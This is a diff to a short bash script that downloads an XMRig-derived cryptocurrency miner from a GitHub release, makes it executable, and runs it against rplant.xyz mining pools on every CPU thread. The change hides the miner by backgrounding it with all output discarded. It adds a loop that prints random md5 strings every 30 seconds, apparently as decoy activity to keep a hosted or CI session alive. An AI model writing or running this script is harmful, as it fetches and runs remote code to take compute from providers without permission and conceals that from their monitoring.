@@ -1,5 +1,5 @@
 #!/bin/bash
 curl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl -L -o vrl
 chmod 777 vrl
-./vrl --url eu.rplant.xyz:17155 --tls -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel \
-  --url na.rplant.xyz:17155 --tls -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel -t $(nproc --all)
+./vrl --url eu.rplant.xyz:17155 --tls -u v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x -p webpassword=x -k -a randomvirel -t $(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
